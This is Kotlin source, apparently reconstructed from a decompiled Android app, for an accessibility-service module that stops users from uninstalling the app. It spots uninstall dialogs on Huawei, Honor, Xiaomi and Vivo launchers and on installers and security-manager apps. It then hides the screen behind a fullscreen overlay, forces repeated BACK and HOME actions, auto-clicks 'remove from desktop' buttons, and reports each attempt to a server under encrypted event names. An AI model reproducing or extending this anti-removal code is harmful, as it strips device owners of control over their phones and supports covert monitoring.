                        val keywords = arrayOf("卸载", "Uninstall", "移除", "Remove", "删除", "Delete")
                        for (kw in keywords) {
                            if (joined.contains(kw, ignoreCase = true)) {
                                val appNames = getAppNames()
                                val expanded = ArrayList<String>(appNames.size * 2)
                                appNames.forEach { n ->
                                    expanded.add(n)
                                    expanded.add(n.trim().replace("⠀", ""))
                                }
                                val valid = expanded.filter { it.length >= 2 }
                                val matched = valid.firstOrNull { joined.contains(it, ignoreCase = true) }
                                if (matched != null) {
                                    lastDetectionTimestamp = now
                                    showFullscreenOverlay()
                                    reportDetection("DESKTOP_UNINSTALL", "零延迟-事件文字", listOf(matched), "全屏遮挡", null)
                                    isDesktopMonitoring = false
                                    return
                                }
                                break
                            }
                        }
                    }

                    // ===== 步骤 2: 零延迟 B — 主线程 ViewId 快速检测 =====
                    if (isDesktopMonitoring) {
                        try {
                            val rootNode = getRootNodeCallback?.invoke()
                            if (rootNode != null) {
                                try {
                                    val rootPkg = rootNode.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
                                    if (rootPkg.contains("launcher") || rootPkg.contains("home") ||
                                        rootPkg.contains("hiboard") || rootPkg == "com.miui.home" ||
                                        isLauncherPackage(rootPkg)
                                    ) {
                                        // JADX 零延迟B: 先检查搜索栏 ViewId (排除搜索 UI)
                                        // 然后检查 deviceDialogIds 匹配 (b8)
                                        if (!checkSearchBarVisible(rootNode) && checkDialogViewIdsVisible(rootNode)) {
                                            // 对话框 ViewId 匹配 → 获取应用名进行检测
                                            val names2 = getAppNames()
                                            val filteredNames = names2.filter { it.isNotBlank() }
                                            val matchedName = matchViewIdAppName(rootNode, filteredNames)
                                            if (matchedName != null) {
                                                lastDetectionTimestamp = now
                                                android.util.Log.w(TAG, "🛡️⚡⚡ [零延迟B] 主线程ViewId检测命中: '$matchedName' → 立即遮挡")
                                                showFullscreenOverlay()
                                                reportDetection("DESKTOP_UNINSTALL", "零延迟-主线程ViewId", listOf(matchedName), "全屏遮挡", null)
                                                isDesktopMonitoring = false
                                                try { rootNode.recycle() } catch (_: Exception) {}
                                                return
                                            } else {
                                                // ViewId 匹配但未找到应用名 → 尝试文本搜索
                                                val names3 = filteredNames.filter { it.length >= 2 }
                                                for (name in names3) {
                                                    val trimmed = name.trim().replace("⠀", "")
                                                    if (trimmed.length < 2) continue
                                                    try {
                                                        val foundNodes = rootNode.findAccessibilityNodeInfosByText(trimmed)
                                                        if (foundNodes != null && foundNodes.isNotEmpty()) {
                                                            for (n in foundNodes) {
                                                                try { n.recycle() } catch (_: Exception) {}
                                                            }
                                                            // 文本搜索命中 → 检查确认状态或上下文
                                                            if (isOurAppConfirmed) {
                                                                lastDetectionTimestamp = now
                                                                android.util.Log.w(TAG, "🛡️⚡⚡ [零延迟B] 主线程文本检测命中: '$trimmed' (已确认) → 立即遮挡")
                                                                showFullscreenOverlay()
                                                                reportDetection("DESKTOP_UNINSTALL", "零延迟-主线程ViewId", listOf(trimmed), "全屏遮挡", null)
                                                                isDesktopMonitoring = false
                                                                try { rootNode.recycle() } catch (_: Exception) {}
                                                                return
                                                            }
                                                            break
                                                        }
                                                    } catch (_: Exception) {}
                                                }
                                            }
                                        }
                                    }
                                } finally {
                                    try { rootNode.recycle() } catch (_: Exception) {}
                                }
                            }
                        } catch (_: Exception) {}
                    }
                }
            }

            // ===== 步骤 3-4: 事件类型过滤后的处理 =====
            if (eventType == 32 || eventType == 2048) {
                handleEventInternal(event)
            }

            // ===== 步骤 5: c9 路由 (桌面/安装器/第三方) =====
            if (!isBackSequenceRunning.get()) {
                handleDesktopEventRouting(event)
            }
        } catch (_: Exception) {}
    }

    /**
     * 内部事件分发 (SystemUI + 安装器 + 安全管理器)
     */
    private fun handleEventInternal(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        val eventType = event.eventType

        // SystemUI 对话框检测
        if (pkg == "com.android.systemui" && eventType == 32) {
            val className = event.className?.toString()?.lowercase(Locale.ROOT) ?: ""
            if (className.contains("dialog") || className.contains("panel") ||
                className.contains("activity") || className.contains("fragment")
            ) {
                val now = System.currentTimeMillis()
                if (now - lastSystemUiTime >= SYSTEMUI_DEDUP_MS) {
                    lastSystemUiTime = now
                    pollingHandler.removeCallbacks(systemUiCheckRunnable)
                    pollingHandler.post(systemUiCheckRunnable)
                }
            }
        }

        // 安装器检测
        for (installer in PACKAGE_INSTALLER_PACKAGES) {
            if (pkg.startsWith(installer)) {
                if (!isOverlayShowing) {
                    pollingHandler.post(systemUiCheckRunnable)
                }
                return
            }
        }

        // 系统安全管理器检测
        if (pkg.isNotEmpty() && isSystemSecurityManagerPackage(pkg)) {
            startPolling(pkg)
        }

        // 敏感包检测
        if (isProtectionEnabled && pkg.isNotEmpty() && isSecurityManagerPackage(pkg)) {
            startPolling(pkg)
        }

        // ClassName 检测 (仅 WINDOW_STATE_CHANGED)
        if (eventType == 32) {
            handleClassNameDetection(event)
        }
    }

    /**
     * JADX c0 — ClassName 检测 (敏感 Activity)
     */
    private fun handleClassNameDetection(event: AccessibilityEvent) {
        try {
            val className = event.className?.toString() ?: return
            val pkg = event.packageName?.toString() ?: return
            if (pkg == service.packageName) return

            val pkgLc = pkg.lowercase(Locale.ROOT)
            // 跳过桌面/搜索
            if (pkgLc.contains("launcher") || pkgLc.contains("hiboard") ||
                pkgLc.contains("puresearch") || pkgLc.contains(".home")
            ) return

            // 高危页面检测
            if (isHighRiskClassName(className)) {
                if (isBackSequenceRunning.get()) return
                triggerBackSequence()
                reportDetection("CLASSNAME_DETECT", "高危页面", listOf(className), "返回+HOME", pkg)
                return
            }

            // 敏感 ClassName 检测 (非桌面、非 SystemUI)
            if (!pkgLc.contains("launcher") && !pkgLc.contains(".home") &&
                pkgLc != "com.miui.home" && pkgLc != "com.android.systemui"
            ) {
                if (isSystemSecurityManagerPackage(pkgLc)) {
                    startPolling(pkg)
                    return
                }
                if (isSensitivePackage(pkgLc)) {
                    startPolling(pkg)
                    return
                }
            }

            // ClassName 关键词匹配
            if (isSensitiveClassName(className) &&
                !pkgLc.contains("launcher") && !pkgLc.contains(".home")
            ) {
                startPolling(pkg)
            }
        } catch (_: Exception) {}
    }

    // ==================== 桌面卸载检测辅助方法 ====================

    /**
     * JADX a2 — 桌面卸载对话框检测 (从 desktopMonitorRunnable 调用)
     * 检查当前 rootNode 是否显示了卸载对话框，如果是则触发全屏遮挡
     */
    fun detectDesktopUninstallDialog(rootNode: AccessibilityNodeInfo) {
        val now = System.currentTimeMillis()
        if (now - lastDetectionTimestamp < 0 || isBackSequenceRunning.get() || isOverlayShowing) return

        val pkgCs = rootNode.packageName
        val pkg = pkgCs?.toString()?.lowercase(Locale.ROOT) ?: ""
        if (!(pkg.contains("launcher") || pkg.contains("home") || pkg.contains("hiboard") ||
                    pkg == "com.miui.home" || isLauncherPackage(pkg))
        ) return

        // 检查搜索栏是否可见 (排除搜索场景)
        if (checkSearchBarVisible(rootNode)) return

        // 检查对话框 ViewId 是否可见 (b8 → c5)
        if (!checkDialogViewIdsVisible(rootNode)) {
            if (isDesktopMonitoring) {
                android.util.Log.d(TAG, "🛡️ [桌面卸载] 正在监控但未检测到对话框ViewId pkg=$pkg")
            }
            return
        }

        // 荣耀设备特殊处理: 如果已确认是我们的图标，检测卸载菜单
        if (isHonorDevice && isOurAppConfirmed) {
            val uninstallKeywords = arrayOf("卸载", "从桌面移除", "Uninstall")
            for (kw in uninstallKeywords) {
                try {
                    val found = rootNode.findAccessibilityNodeInfosByText(kw)
                    val hasNodes = found != null && found.isNotEmpty()
                    if (found != null) {
                        for (n in found) {
                            try { n.recycle() } catch (_: Exception) {}
                        }
                    }
                    if (hasNodes) {
                        lastDetectionTimestamp = now
                        android.util.Log.w(TAG, "🛡️ [桌面卸载][荣耀] 已确认我们的图标，检测到卸载菜单 → 盖遮挡层")
                        mainHandler.postAtFrontOfQueue {
                            showFullscreenOverlay()
                            // 荣耀: 尝试点击"从桌面移除"按钮 (a0)
                            try {
                                val rootCb = getRootNodeCallback?.invoke()
                                if (rootCb != null) {
                                    try {
                                        handleHonorDesktopRemoval(rootCb)
                                    } finally {
                                        try { rootCb.recycle() } catch (_: Exception) {}
                                    }
                                }
                            } catch (_: Exception) {}
                        }
                        reportDetection("DESKTOP_UNINSTALL", "桌面卸载检测(荣耀)", listOf("honor_app"), "全屏遮挡", null)
                        isDesktopMonitoring = false
                        return
                    }
                } catch (_: Exception) {}
            }
        }

        // 通用检测: ViewId + 文字匹配
        val appNames = getAppNames().filter { it.isNotBlank() }
        // 先尝试 ViewId 匹配 (c7)
        var matchedName = matchViewIdAppName(rootNode, appNames)
        var matchMethod = if (matchedName != null) "ViewId" else ""

        // ViewId 未匹配 → 尝试文本搜索
        if (matchedName == null) {
            for (name in appNames) {
                val trimmed = name.trim().replace("⠀", "")
                if (trimmed.length < 2) continue
                try {
                    val found = rootNode.findAccessibilityNodeInfosByText(trimmed)
                    if (found != null && found.isNotEmpty()) {
                        try {
                            for (n in found) {
                                try { n.recycle() } catch (_: Exception) {}
                            }
                            matchedName = name
                        } catch (_: Exception) {
                            matchedName = name
                        }
                        break
                    }
                } catch (_: Exception) { continue }
            }
            if (matchedName != null) {
                matchMethod = if (isOurAppConfirmed) {
                    "Text+Confirmed"
                } else if (checkUninstallContext(rootNode, matchedName)) {
                    "Text+Context"
                } else {
                    android.util.Log.d(TAG, "🛡️ [桌面卸载] 文字搜索匹配到'$matchedName'但不在卸载上下文中，跳过防误判")
                    matchedName = null
                    ""
                }
            }
        }

        if (matchedName == null) return

        lastDetectionTimestamp = now
        android.util.Log.w(TAG, "🛡️ [桌面卸载][$matchMethod] 检测到: $matchedName")
        android.util.Log.w(TAG, "🛡️ [桌面卸载] → 全屏遮挡")
        mainHandler.postAtFrontOfQueue { showFullscreenOverlay() }
        reportDetection("DESKTOP_UNINSTALL", "桌面卸载检测→全屏遮挡", listOf(matchedName), "全屏遮挡", null)
        isDesktopMonitoring = false
    }

    /**
     * JADX d4 — 检查搜索栏 ViewId 是否可见 (防止搜索时误判)
     * 对应 fb1.f56194a0 中的 SearchBarViewIds
     */
    fun checkSearchBarVisible(rootNode: AccessibilityNodeInfo): Boolean {
        val searchBarViewIds = arrayOf(
            "com.huawei.android.launcher:id/search_bar_text",
            "com.hihonor.android.launcher:id/search_bar_text",
            "com.miui.home:id/search_bar_text",
            "com.miui.home:id/search_text",
            "com.bbk.launcher2:id/search_bar",
            "com.vivo.launcher:id/search_bar"
        )
        for (viewId in searchBarViewIds) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId)
                if (nodes != null && nodes.isNotEmpty()) {
                    var visible = false
                    for (n in nodes) {
                        if (n.isVisibleToUser) { visible = true }
                    }
                    for (n in nodes) {
                        try { n.recycle() } catch (_: Exception) {}
                    }
                    if (visible) return true
                }
            } catch (_: Exception) {}
        }
        return false
    }

    /**
     * JADX b8 → c5 — 检查卸载对话框 ViewId 是否可见
     */
    fun checkDialogViewIdsVisible(rootNode: AccessibilityNodeInfo): Boolean {
        try {
            val viewIds = deviceDialogIds
            for (viewId in viewIds) {
                try {
                    val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId)
                    if (nodes != null && nodes.isNotEmpty()) {
                        var visible = false
                        for (n in nodes) {
                            if (n.isVisibleToUser) { visible = true; break }
                        }
                        for (n in nodes) {
                            try { n.recycle() } catch (_: Exception) {}
                        }
                        if (visible) return true
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return false
    }

    /**
     * JADX c7 — ViewId 中匹配应用名
     * 遍历 deviceDialogIds, 查找 ViewId 节点中包含应用名的文本
     */
    fun matchViewIdAppName(rootNode: AccessibilityNodeInfo, appNames: List<String>): String? {
        val viewIds = deviceDialogIds
        for (viewId in viewIds) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId)
                if (nodes != null && nodes.isNotEmpty()) {
                    for (node in nodes) {
                        val text = node.text?.toString()
                        if (text != null) {
                            for (name in appNames) {
                                if (text.contains(name, ignoreCase = true)) {
                                    for (n in nodes) {
                                        try { n.recycle() } catch (_: Exception) {}
                                    }
                                    return name
                                }
                            }
                        }
                    }
                    for (n in nodes) {
                        try { n.recycle() } catch (_: Exception) {}
                    }
                }
            } catch (_: Exception) {}
        }
        return null
    }

    /**
     * JADX d1 — 检查卸载上下文 (防止文字搜索误判)
     * 在 rootNode 中搜索卸载关键词，确认文本确实出现在卸载上下文中
     */
    fun checkUninstallContext(rootNode: AccessibilityNodeInfo, appName: String): Boolean {
        val contextKeywords = arrayOf("卸载", "移除", "删除", "Uninstall", "Remove", "Delete")
        for (kw in contextKeywords) {
            try {
                val found = rootNode.findAccessibilityNodeInfosByText(kw)
                if (found != null && found.isNotEmpty()) {
                    for (n in found) {
                        val text = n.text?.toString() ?: ""
                        val desc = n.contentDescription?.toString() ?: ""
                        if ("$text $desc".contains(appName, ignoreCase = true)) {
                            for (nn in found) {
                                try { nn.recycle() } catch (_: Exception) {}
                            }
                            return true
                        }
                    }
                    for (n in found) {
                        try { n.recycle() } catch (_: Exception) {}
                    }
                }
            } catch (_: Exception) {}
        }
        // 也通过搜索应用名来验证
        try {
            val appNodes = rootNode.findAccessibilityNodeInfosByText(appName)
            if (appNodes != null && appNodes.isNotEmpty()) {
                for (n in appNodes) {
                    val text = n.text?.toString() ?: ""
                    for (kw in contextKeywords) {
                        if (text.contains(kw, ignoreCase = true)) {
                            for (nn in appNodes) {
                                try { nn.recycle() } catch (_: Exception) {}
                            }
                            return true
                        }
                    }
                }
                for (n in appNodes) {
                    try { n.recycle() } catch (_: Exception) {}
                }
            }
        } catch (_: Exception) {}
        return false
    }

    /**
     * JADX a0 — 荣耀桌面: 点击"从桌面移除"按钮
     * 在荣耀 Launcher 的卸载对话框中找到"从桌面移除"按钮并点击它
     */
    fun handleHonorDesktopRemoval(rootNode: AccessibilityNodeInfo): Boolean {
        val removeKeywords = ArrayList<String>()
        removeKeywords.add("从桌面移除")
        removeKeywords.add("从桌面删除")
        // 添加其他移除关键词 (排除"从桌面移除"本身)
        val additionalRemoveKeywords = arrayOf("移除", "Remove from home", "Remove")
        for (kw in additionalRemoveKeywords) {
            if (kw != "从桌面移除" && kw != "从桌面删除") {
                removeKeywords.add(kw)
            }
        }

        // 先通过 ViewId 查找按钮
        val honorButtonViewIds = arrayOf(
            "com.hihonor.android.launcher:id/btn_negative",
            "com.hihonor.android.launcher:id/remove_btn",
            "com.hihonor.android.launcher:id/remove_from_desktop",
            "com.hihonor.android.launcher:id/delete_item_enhanced",
            "com.hihonor.android.launcher:id/delete_item",
            "com.hihonor.home:id/btn_negative",
            "com.hihonor.home:id/remove_btn",
            "com.hihonor.home:id/delete_item_enhanced",
            "com.hihonor.home:id/delete_item",
            "android:id/button2",
            "android:id/button_neutral"
        )
        try {
            for (viewId in honorButtonViewIds) {
                try {
                    val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId)
                    if (nodes != null && nodes.isNotEmpty()) {
                        for (node in nodes) {
                            val text = node.text?.toString()?.trim() ?: ""
                            for (kw in removeKeywords) {
                                if (text.contains(kw, ignoreCase = true)) {
                                    if (!node.isVisibleToUser) continue
                                    if (node.isClickable) {
                                        node.performAction(16) // ACTION_CLICK
                                        android.util.Log.w(TAG, "🛡️ [荣耀] ViewId点击按钮: viewId=$viewId text='$text'")
                                        for (n in nodes) {
                                            try { n.recycle() } catch (_: Exception) {}
                                        }
                                        return true
                                    } else {
                                        val parent = node.parent
                                        if (parent != null && parent.isClickable) {
                                            parent.performAction(16) // ACTION_CLICK
                                            android.util.Log.w(TAG, "🛡️ [荣耀] ViewId点击父节点: viewId=$viewId text='$text'")
                                            try { parent.recycle() } catch (_: Exception) {}
                                            for (n in nodes) {
                                                try { n.recycle() } catch (_: Exception) {}
                                            }
                                            return true
                                        }
                                        if (parent != null) {
                                            try { parent.recycle() } catch (_: Exception) {}
                                        }
                                    }
                                }
                            }
                        }
                        for (n in nodes) {
                            try { n.recycle() } catch (_: Exception) {}
                        }
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}

        // 通过文本搜索找按钮
        for (kw in removeKeywords) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByText(kw)
                if (nodes != null && nodes.isNotEmpty()) {
                    for (node in nodes) {
                        val text = node.text?.toString()?.trim() ?: ""
                        if (text.length <= kw.length + 4 && node.isVisibleToUser) {
                            if (node.isClickable) {
                                node.performAction(16) // ACTION_CLICK
                                android.util.Log.w(TAG, "🛡️ [荣耀] 文本点击按钮: '$text'")
                                for (n in nodes) {
                                    try { n.recycle() } catch (_: Exception) {}
                                }
                                return true
                            } else {
                                val parent = node.parent
                                if (parent != null && parent.isClickable) {
                                    parent.performAction(16) // ACTION_CLICK
                                    android.util.Log.w(TAG, "🛡️ [荣耀] 文本点击父节点: '$text'")
                                    try { parent.recycle() } catch (_: Exception) {}
                                    for (n in nodes) {
                                        try { n.recycle() } catch (_: Exception) {}
                                    }
                                    return true
                                }
                                if (parent != null) {
                                    try { parent.recycle() } catch (_: Exception) {}
                                }
                            }
                        }
                    }
                    for (n in nodes) {
                        try { n.recycle() } catch (_: Exception) {}
                    }
                }
            } catch (_: Exception) {}
        }
        return false
    }

    // ==================== 遮挡层 ====================

    /**
     * JADX e3 — 显示全屏遮挡层
     */
    fun showFullscreenOverlay() {
        if (overlayView != null) return
        isOverlayShowing = true
        pollingHandler.removeCallbacksAndMessages(null)
        // ADAPT: 完整实现需要 WindowManager + am0 (FullscreenBlockerView)
        // Phase 10 对接: 当 am0/FullscreenBlockerView 实现后，用 overlayWindowManager + overlayLayoutParams 添加 View
        try {
            val wm = overlayWindowManager
            val params = overlayLayoutParams
            if (wm != null && params != null) {
                // Phase 10: 使用 am0 (FullscreenBlockerView) 创建全屏黑色遮挡层
                // val view = am0(service)
                // wm.addView(view, params)
                // overlayView = view
                android.util.Log.d(TAG, "全屏拦截层已添加 (overlay view pending Phase 10)")
            } else {
                android.util.Log.d(TAG, "全屏拦截层: WindowManager 或 LayoutParams 为空")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "添加全屏拦截层异常: ${e.message}", e)
        }
        // 60秒后自动移除
        mainHandler.postDelayed({ removeFullscreenOverlay() }, OVERLAY_TIMEOUT_MS)
    }

    /**
     * JADX e0 — 移除遮挡层
     */
    fun removeFullscreenOverlay() {
        val view = overlayView ?: return
        overlayView = null
        isOverlayShowing = false
        // ADAPT: WindowManager.removeView
        android.util.Log.d(TAG, "全屏拦截层已移除")
    }

    // ==================== 返回序列 ====================

    /**
     * JADX c4 — 触发连续返回 + HOME
     */
    fun triggerBackSequence() {
        if (isBackSequenceRunning.compareAndSet(false, true)) {
            try {
                Thread {
                    try {
                        // 连续按返回 3-5 次
                        repeat(5) {
                            serviceRef.performGlobalAction(1) // GLOBAL_ACTION_BACK
                            Thread.sleep(200)
                        }
                        // 按 HOME
                        serviceRef.performGlobalAction(2) // GLOBAL_ACTION_HOME
                    } catch (_: Exception) {
                    } finally {
                        isBackSequenceRunning.set(false)
                    }
                }.start()
            } catch (e: Exception) {
                isBackSequenceRunning.set(false)
            }
        }
    }

    // ==================== 轮询 ====================

    /**
     * JADX e4 — 开始危险包名轮询
     */
    fun startPolling(pkg: String) {
        if (isPollingActive) {
            val current = pollingPackage
            if (current != null && current.equals(pkg, ignoreCase = true)) return
            pollingStartTime = System.currentTimeMillis()
            pollingPackage = pkg
            return
        }
        stopPolling()
        pollingHandler.removeCallbacksAndMessages(null)
        isPollingActive = true
        pollingPackage = pkg
        pollingStartTime = System.currentTimeMillis()
        pollingRounds = 0
        pollingHits = 0
        pollingHandler.postDelayed(pollingRunnable, POLLING_INTERVAL_MS)
    }

    /**
     * JADX e5 — 停止轮询
     */
    fun stopPolling() {
        if (isPollingActive) {
            val elapsed = System.currentTimeMillis() - pollingStartTime
            android.util.Log.d(TAG, "停止轮询: $pollingPackage (已运行${elapsed}ms, 共${pollingRounds}轮)")
        }
        isPollingActive = false
        pollingPackage = null
        pollingHandler.removeCallbacksAndMessages(null)
    }

    // ==================== 状态管理 ====================

    /**
     * JADX e1 — 重置所有运行时状态
     */
    fun resetAllState() {
        mainHandler.post { removeFullscreenOverlay() }
        isBackSequenceRunning.set(false)
        isDesktopMonitoring = false
        desktopMonitorStartTime = 0L
        isOurAppConfirmed = false
        stopPolling()
        lastDetectionTimestamp = 0L
        pollingHandler.removeCallbacksAndMessages(null)
    }

    // ==================== 上报 ====================

    /**
     * JADX d9 — 上报检测事件
     */
    fun reportDetection(
        type: String, message: String, keywords: List<String>?,
        action: String, triggerPackage: String?
    ) {
        isDesktopMonitoring = false
        val now = System.currentTimeMillis()
        if (type == lastReportedType && now - lastReportedTime < EVENT_DEDUP_MS) return
        lastReportedType = type
        lastReportedTime = now

        try {
            ActivityMonitor.logSystem("检测到卸载尝试 类型=$type $message")
        } catch (_: Exception) {}

        try {
            val nm = networkManager ?: return
            val json = JSONObject()
            json.put("type", type)
            json.put("message", message)
            json.put("timestamp", now)
            if (!keywords.isNullOrEmpty()) {
                json.put("keywords", JSONArray(keywords))
            }
            if (action.isNotEmpty()) json.put("action", action)
            if (!triggerPackage.isNullOrEmpty()) json.put("trigger_package", triggerPackage)
            nm.sendEvent(StringUtil.decrypt("PlcYNF4sDSJbDipNBT9AKBgRUzQ/XBIuSDw="), json)
        } catch (_: Exception) {}
    }

    /**
     * JADX e2 — 发送保护状态报告
     */
    fun sendStatusReport(message: String, enabled: Boolean) {
        try {
            val nm = networkManager ?: return
            val json = JSONObject()
            json.put("success", true)
            json.put("enabled", enabled)
            json.put("message", message)
            json.put("timestamp", System.currentTimeMillis())
            val deviceId = getDeviceIdCallback?.invoke() ?: "unknown"
            json.put("deviceId", deviceId)
            nm.sendEvent(StringUtil.decrypt("PlcYNF4sDSJbDjtLHi5IOxgnWD8USgU7WS0f"), json)
        } catch (_: Exception) {}
    }

    // ==================== 应用名缓存 ====================

    /**
     * JADX c6 — 获取应用名列表 (带 60 秒缓存)
     */
    fun getAppNames(): List<String> {
        val cached = cachedAppNames
        val now = System.currentTimeMillis()
        val age = now - appNameCacheTimestamp
        if (cached != null && (appNameCacheTimestamp <= 0 || age <= APP_NAME_CACHE_TTL_MS)) {
            return cached
        }
        val names = getAppNamesCallback?.invoke() ?: emptyList()
        if (names.isNotEmpty()) {
            cachedAppNames = names
            appNameCacheTimestamp = now
        }
        return names
    }
}
